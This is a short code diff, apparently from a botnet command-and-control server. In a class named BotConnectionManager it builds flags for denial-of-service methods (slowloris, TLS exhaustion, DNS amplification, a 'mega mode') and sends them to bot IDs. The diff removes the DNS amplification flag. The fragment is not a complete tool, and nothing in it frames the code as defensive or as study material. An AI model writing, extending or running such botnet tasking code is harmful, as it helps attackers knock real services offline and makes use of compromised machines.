@@ -133,7 +133,6 @@ class BotConnectionManager:
         flags = {
             "slowloris": 1 if method == "SLOWLORIS" or task.get("slowloris") else 0,
             "tls_exhaust": 1 if method == "TLS_EXHAUST" or task.get("tls_exhaust") else 0,
-            "dns_amp": 1 if method == "DNS_AMP" or task.get("dns_amp") else 0,
             "mega_mode": 1 if method == "MEGA" or task.get("mega_mode") else 0,
         }
         ok = await self.send_json(bot_id, {
